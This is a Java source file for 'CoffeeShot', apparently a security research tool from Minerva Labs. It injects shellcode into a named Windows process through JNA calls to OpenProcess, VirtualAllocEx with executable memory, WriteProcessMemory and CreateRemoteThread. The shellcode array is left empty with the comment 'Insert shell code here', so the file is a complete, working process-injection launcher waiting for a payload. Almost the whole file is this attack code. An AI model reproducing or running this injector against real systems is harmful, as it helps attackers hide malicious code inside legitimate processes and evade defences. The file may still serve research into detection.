import com.sun.jna.Native;
import com.sun.jna.win32.W32APIOptions;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.WinDef.DWORD;
import com.sun.jna.platform.win32.Tlhelp32;
import com.sun.jna.platform.win32.WinNT;
// Imports for MyKernel32
import com.sun.jna.win32.StdCallLibrary;
import com.sun.jna.ptr.IntByReference;
import com.sun.jna.Pointer;
import com.sun.jna.Memory;
 

public class CoffeeShot
{
    static Kernel32 kernel32 = (Kernel32)Native.loadLibrary(Kernel32.class, W32APIOptions.UNICODE_OPTIONS);
    static IKernel32 iKernel32 = (IKernel32)Native.loadLibrary("kernel32", IKernel32.class);
    static String usage = "Usage: Java -jar CoffeeShot.jar [processName]" + System.getProperty("line.separator") + "processName example: notepad++.exe";

    // Pointer to the API's
    interface IKernel32 extends StdCallLibrary
    {
        boolean WriteProcessMemory(Pointer p, int address, Memory bufferToWrite, int size, IntByReference written);
        boolean ReadProcessMemory(Pointer hProcess, int inBaseAddress, Pointer outputBuffer, int nSize, IntByReference outNumberOfBytesRead);
        int VirtualQueryEx(Pointer hProcess, Pointer lpMinimumApplicationAddress, Pointer lpBuffer, int dwLength);
        Pointer OpenProcess(int desired, boolean inherit, int pid);
        int VirtualAllocEx(Pointer hProcess, Pointer lpAddress, int i,
    			int flAllocationType, int flProtect);
		void CreateRemoteThread(Pointer hOpenedProcess, Object object, int i, int baseAddress, int j, int k,
				Object object2);
    }
    
    public static void main(String[] args)
    {
    	System.out.println("    _\r\n" + 
    			"   | |\r\n" + 
    			"   |J|________|______________________|_\r\n" + 
    			"   |A|        | 0| 1| 0| 1| 0| 1| 0| | |________________\r\n" + 
    			"   |V|________|______________________|_|\r\n" + 
    			"   |A|        |      CoffeeShot      |\r\n" + 
    			"   |_|\r\n" + 
    			"   \r\n" + 
    			"   https://github.com/MinervaLabsResearch/CoffeeShot"
    			+ "\r\n");
    	
    	
        // Process name to inject
        String processName = "";
        if(args.length < 1)
        {
            System.err.println(usage);
            System.exit(1);
        }
        try {
        	processName = args[0];
        }
        catch(NumberFormatException e)
        {
            System.err.println(usage);
            System.exit(1);
        }
        
        // Insert shell code here
        byte[] shellcode = {
        		
        };


        int shellcodeSize = shellcode.length;
        
        // Finding process
        long processId = findProcessID(processName);
        if(processId == 0L)
        {
            System.err.println("The searched process was not found : " + processName);
            System.exit(1);
        }
        System.out.println(processName + " Process id: " + processId);
       
        
        // Open process
        Pointer hOpenedProcess = iKernel32.OpenProcess(0x0010 + 0x0020 + 0x0008 + 0x0400 + 0x0002, true, (int)processId);
        
        // Check if the desired process is 32bit
        if(checkIfProcessIsWow64(hOpenedProcess))
        {
            System.err.println("The target process is 64bit which currently not supported");
            System.exit(0);
        }

        // Generate Buffer to write
        IntByReference bytesWritten = new IntByReference(0);
        Memory bufferToWrite = new Memory(shellcodeSize);
        
        for(int i = 0; i < shellcodeSize; i++)
        {
        	bufferToWrite.setByte(i, shellcode[i]);
        }
        
        // Allocate memory
        int baseAddress = iKernel32.VirtualAllocEx(hOpenedProcess, Pointer.createConstant(0), shellcodeSize, 4096, 64);
        System.out.println("Allocated Memory: " + Integer.toHexString(baseAddress));
       
        // Write Buffer to memory
        iKernel32.WriteProcessMemory(hOpenedProcess, baseAddress, bufferToWrite, shellcodeSize, bytesWritten);
        System.out.println("Wrote " + bytesWritten.getValue() + " bytes.");
        
        // Create Thread in the victim process
        iKernel32.CreateRemoteThread(hOpenedProcess,  null, 0, baseAddress, 0, 0, null);
    }
    
    
    /*
     *  Search for the desired process
     *  @param the process name we wish to inject
     *  @return the handle of the desired process
     */
    static long findProcessID(String processName)
    {
        Tlhelp32.PROCESSENTRY32.ByReference processInfo = new Tlhelp32.PROCESSENTRY32.ByReference();
        WinNT.HANDLE processSnapshotHandle = kernel32.CreateToolhelp32Snapshot(Tlhelp32.TH32CS_SNAPPROCESS, new DWORD(0L));
        
        try{
        	// Check is this is the process we wish to inject
            kernel32.Process32First(processSnapshotHandle, processInfo);
            
            if(processName.equals(Native.toString(processInfo.szExeFile)))
            {
                return processInfo.th32ProcessID.longValue();
            }
           
            
            while(kernel32.Process32Next(processSnapshotHandle, processInfo))
            {
                if(processName.equals(Native.toString(processInfo.szExeFile)))
                {
                    return processInfo.th32ProcessID.longValue();
                }
            }

            return 0L;    

        }
        finally
        {
            kernel32.CloseHandle(processSnapshotHandle);
        }
    }
    

    /*
     *  Checks for the process architecture
     *  @param handle to the opened process
     *  @return if the process architecture is 64bit
     */
    private static boolean checkIfProcessIsWow64(Pointer hOpenedProcess){
        IntByReference ref = new IntByReference();
        WinNT.HANDLE handleToProcess = new WinNT.HANDLE(hOpenedProcess);
       
		if (!kernel32.IsWow64Process(handleToProcess, ref)){
			System.err.println("Couldn't open handle to the desired process!");
			System.exit(1);
        }
		
        return ref.getValue() == 0;
    }
}